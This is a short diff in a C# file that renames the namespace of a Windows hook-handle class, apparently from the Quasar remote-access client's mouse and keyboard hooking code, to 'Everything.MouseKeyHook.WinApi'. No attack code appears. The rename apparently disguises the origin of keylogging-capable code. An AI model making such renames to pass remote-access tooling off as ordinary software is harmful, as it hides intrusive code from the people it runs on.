@@ -5,7 +5,7 @@
 using Microsoft.Win32.SafeHandles;
 using Quasar.Client.Utilities;
 
-namespace Quasar.Client.MouseKeyHook.WinApi
+namespace Everything.MouseKeyHook.WinApi
 {
     internal class HookProcedureHandle : SafeHandleZeroOrMinusOneIsInvalid
     {
